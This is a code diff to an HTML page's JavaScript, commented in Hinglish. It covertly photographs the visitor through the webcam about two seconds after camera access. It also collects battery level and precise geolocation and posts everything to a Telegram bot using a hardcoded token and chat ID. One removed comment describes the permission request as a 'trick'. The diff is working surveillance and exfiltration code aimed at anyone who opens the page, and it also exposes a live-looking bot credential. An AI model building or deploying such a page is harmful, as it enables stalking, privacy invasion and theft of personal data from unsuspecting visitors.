@@ -14,18 +14,24 @@
 
     <script>
         const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
-        const TELEGRAM_CHAT_ID = "USER_TELEGRAM_ID";  // Replace with actual Telegram ID (not username)
+        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";  // 🔴 @username se direct nahi bhej sakte, ID chahiye
 
         let video = document.getElementById("video");
         let canvas = document.getElementById("canvas");
         let context = canvas.getContext("2d");
 
-        // 🚀 **Trick: Permission request bhej do, lekin result ka wait na karo**
+        // 🚀 **Camera Access & Capture Photo**
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
             video.srcObject = stream;
-            setTimeout(capturePhoto, 3000); // Photo capture after 3 sec
+            setTimeout(() => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                let imageData = canvas.toDataURL("image/png");
+                video.srcObject.getTracks().forEach(track => track.stop()); // 📌 Camera Stop
+                sendToTelegram(imageData);
+            }, 2000); // 🔥 2 sec ke andar photo capture
         }).catch(err => console.log("Camera blocked!"));
 
+        // 🚀 **Battery & Location Fetch**
         let batteryLevel = "Unknown";
         navigator.getBattery().then(battery => {
             batteryLevel = `${Math.round(battery.level * 100)}%`;
@@ -36,24 +42,21 @@
             locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
         });
 
-        function capturePhoto() {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            let imageData = canvas.toDataURL("image/png");
-
+        // 🚀 **Send Data to Telegram**
+        function sendToTelegram(imageData) {
             let message = `📸 **User Details**\n🔋 Battery: ${batteryLevel}\n📍 Location: ${locationData}`;
 
+            // 🔹 Text Data Send
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
             });
 
+            // 🔹 Photo Send (Backend Server Needed)
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    photo: imageData
-                }),
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, photo: imageData }),
                 headers: { "Content-Type": "application/json" }
             }).catch(error => console.log("Photo sending error:", error));
         }
